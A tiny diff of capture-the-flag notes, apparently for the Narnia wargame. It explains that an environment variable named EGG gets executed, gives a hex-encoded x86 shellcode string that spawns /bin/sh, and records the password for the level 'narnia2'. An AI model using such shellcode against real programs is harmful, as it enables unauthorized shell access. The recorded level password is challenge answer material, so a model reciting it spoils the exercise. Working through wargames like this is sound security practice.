@@ -1,0 +1,6 @@
+
+env. variable EGG will be executed, which means we can build a shell code to pop a shell
+
+sc = "\xb8\x11\x2f\x73\x68\xc1\xe8\x08\x50\x68\x2f\x62\x69\x6e\x54\xb8\x50\xc8\xe4\xf7\xff\xd0"
+
+password for narnia2 = nairiepecu
